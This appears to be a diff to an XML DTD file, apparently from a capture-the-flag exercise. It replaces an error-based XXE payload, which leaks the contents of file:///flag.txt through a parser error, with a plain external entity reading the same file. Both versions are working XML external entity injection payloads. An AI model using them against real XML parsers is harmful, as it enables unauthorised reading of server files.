@@ -1,4 +1,1 @@
-<!ENTITY % file SYSTEM "file:///flag.txt">
-<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
-%eval;
-%error;
+<!ENTITY omega SYSTEM "file:///flag.txt">
